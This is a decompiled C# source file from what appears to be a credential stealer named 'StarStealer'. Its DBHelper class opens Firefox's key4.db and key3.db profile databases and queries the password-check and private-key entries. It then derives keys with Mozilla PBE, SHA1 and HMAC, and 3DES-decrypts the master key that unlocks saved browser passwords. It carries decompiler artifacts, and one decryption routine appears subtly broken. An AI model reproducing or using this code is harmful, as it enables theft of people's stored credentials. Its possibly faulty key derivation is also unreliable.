using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace StarStealer.Cryptography
{
	internal class DBHelper
	{
		public byte[] CheckKey4DB(string dir, string masterPwd, bool Verbose)
		{
			try
			{
				Asn1Der asn1Der = new Asn1Der();
				byte[] item = new byte[0];
				byte[] item2 = new byte[0];
				byte[] item3 = new byte[0];
				byte[] item4 = new byte[0];
				string query = "SELECT item1,item2 FROM metadata WHERE id = 'password'";
				if (Verbose)
				{
				}
				GetItemsFromQuery(dir, ref item2, ref item, query);
				Asn1DerObject asn1DerObject = asn1Der.Parse(item);
				MozillaPBE mozillaPBE = new MozillaPBE(item2, Encoding.ASCII.GetBytes(""), asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data);
				mozillaPBE.Compute();
				string text = TripleDESHelper.DESCBCDecryptor(mozillaPBE.Key, mozillaPBE.IV, asn1DerObject.objects[0].objects[1].Data);
				if (!text.StartsWith("password-check"))
				{
					return null;
				}
				query = "SELECT a11,a102 FROM nssPrivate";
				GetItemsFromQuery(dir, ref item3, ref item4, query);
				Asn1DerObject asn1DerObject2 = asn1Der.Parse(item3);
				byte[] data = asn1DerObject2.objects[0].objects[0].objects[1].objects[0].Data;
				byte[] data2 = asn1DerObject2.objects[0].objects[1].Data;
				if (Verbose)
				{
				}
				return decrypt3DES(item2, masterPwd, data, data2);
			}
			catch (Exception item5)
			{
				Program.Errors.Add(item5);
				return null;
			}
		}

		private byte[] decrypt3DES(byte[] globalSalt, string masterPwd, byte[] entrySalt, byte[] cipherT)
		{
			try
			{
				SHA1 sHA = SHA1.Create("sha1");
				byte[] array = sHA.ComputeHash(globalSalt);
				Array.Resize(ref array, 40);
				Array.Copy(entrySalt, 0, array, 20, 20);
                byte[] array2 = null;
					
				Array.Resize(ref array2, 40);
				Array.Copy(entrySalt, 0, array2, 20, 20);
				byte[] key = sHA.ComputeHash(array);
				HMAC hMAC = HMAC.Create();
				hMAC.Key = key;
				byte[] array3 = hMAC.ComputeHash(array2);
				Array.Resize(ref array2, 20);
				byte[] array4 = hMAC.ComputeHash(array2);
				Array.Resize(ref array4, 40);
				Array.Copy(entrySalt, 0, array4, 20, 20);
				byte[] sourceArray = hMAC.ComputeHash(array4);
				Array.Resize(ref array3, 40);
				Array.Copy(sourceArray, 0, array3, 20, 20);
				byte[] iv = array3.Skip(array3.Length - 8).ToArray();
				byte[] key2 = array3.Take(24).ToArray();
				return TripleDESHelper.DESCBCDecryptorByte(key2, iv, cipherT).Take(24).ToArray();
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
				return null;
			}
		}

		private void GetItemsFromQuery(string dir, ref byte[] item1, ref byte[] item2, string query)
		{
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_0039: Expected O, but got Unknown
			//IL_0045: Unknown result type (might be due to invalid IL or missing references)
			//IL_004c: Expected O, but got Unknown
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0056: Expected O, but got Unknown
			DataTable dataTable = new DataTable();
			string str = dir + "\\key4.db";
			string text = "data source=" + str + ";New=True;UseUTF16Encoding=True";
			string text2 = string.Format(query);
			SQLiteConnection val = new SQLiteConnection(text);
			try
			{
				((DbConnection)val).Open();
				SQLiteCommand val2 = new SQLiteCommand(text2, val);
				try
				{
					SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
					((DbDataAdapter)val3).Fill(dataTable);
					int count = dataTable.Rows.Count;
					for (int i = 0; i < count; i++)
					{
						Array.Resize(ref item2, ((byte[])dataTable.Rows[i][1]).Length);
						Array.Copy((byte[])dataTable.Rows[i][1], item2, ((byte[])dataTable.Rows[i][1]).Length);
						Array.Resize(ref item1, ((byte[])dataTable.Rows[i][0]).Length);
						Array.Copy((byte[])dataTable.Rows[i][0], item1, ((byte[])dataTable.Rows[i][0]).Length);
					}
					((Component)val3).Dispose();
					((DbConnection)val).Close();
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}

		public byte[] CheckKey3DB(string filePath, string MasterPwd, bool Verbose)
		{
			try
			{
				Converts converts = new Converts();
				Asn1Der asn1Der = new Asn1Der();
				BerkeleyDB berkeleyDB = new BerkeleyDB(Path.Combine(filePath, "key3.db"));
				if (Verbose)
				{
				}
				PasswordCheck passwordCheck = new PasswordCheck(berkeleyDB.Keys.Where(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair6 = p;
					return keyValuePair6.Key.Equals("password-check");
				}).Select(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair5 = p;
					return keyValuePair5.Value;
				}).FirstOrDefault()
					.Replace("-", ""));
				string hexString = berkeleyDB.Keys.Where(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair4 = p;
					return keyValuePair4.Key.Equals("global-salt");
				}).Select(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair3 = p;
					return keyValuePair3.Value;
				}).FirstOrDefault()
					.Replace("-", "");
				if (Verbose)
				{
				}
				MozillaPBE mozillaPBE = new MozillaPBE(converts.ConvertHexStringToByteArray(hexString), Encoding.ASCII.GetBytes(MasterPwd), converts.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
				mozillaPBE.Compute();
				string text = TripleDESHelper.DESCBCDecryptor(mozillaPBE.Key, mozillaPBE.IV, converts.ConvertHexStringToByteArray(passwordCheck.Passwordcheck));
				if (!text.StartsWith("password-check"))
				{
					return null;
				}
				string hexString2 = berkeleyDB.Keys.Where(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair2 = p;
					int result;
					if (!keyValuePair2.Key.Equals("global-salt"))
					{
						keyValuePair2 = p;
						if (!keyValuePair2.Key.Equals("Version"))
						{
							keyValuePair2 = p;
							result = ((!keyValuePair2.Key.Equals("password-check")) ? 1 : 0);
							goto IL_0043;
						}
					}
					result = 0;
					goto IL_0043;
					IL_0043:
					return (byte)result != 0;
				}).Select(delegate(KeyValuePair<string, string> p)
				{
					KeyValuePair<string, string> keyValuePair = p;
					return keyValuePair.Value;
				}).FirstOrDefault()
					.Replace("-", "");
				Asn1DerObject asn1DerObject = asn1Der.Parse(converts.ConvertHexStringToByteArray(hexString2));
				MozillaPBE mozillaPBE2 = new MozillaPBE(converts.ConvertHexStringToByteArray(hexString), Encoding.ASCII.GetBytes(MasterPwd), asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data);
				mozillaPBE2.Compute();
				byte[] dataToParse = TripleDESHelper.DESCBCDecryptorByte(mozillaPBE2.Key, mozillaPBE2.IV, asn1DerObject.objects[0].objects[1].Data);
				Asn1DerObject asn1DerObject2 = asn1Der.Parse(dataToParse);
				Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.objects[0].objects[2].Data);
				byte[] array = new byte[24];
				if (asn1DerObject3.objects[0].objects[3].Data.Length > 24)
				{
					Array.Copy(asn1DerObject3.objects[0].objects[3].Data, asn1DerObject3.objects[0].objects[3].Data.Length - 24, array, 0, 24);
				}
				else
				{
					array = asn1DerObject3.objects[0].objects[3].Data;
				}
				return array;
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
				return null;
			}
		}
	}
}
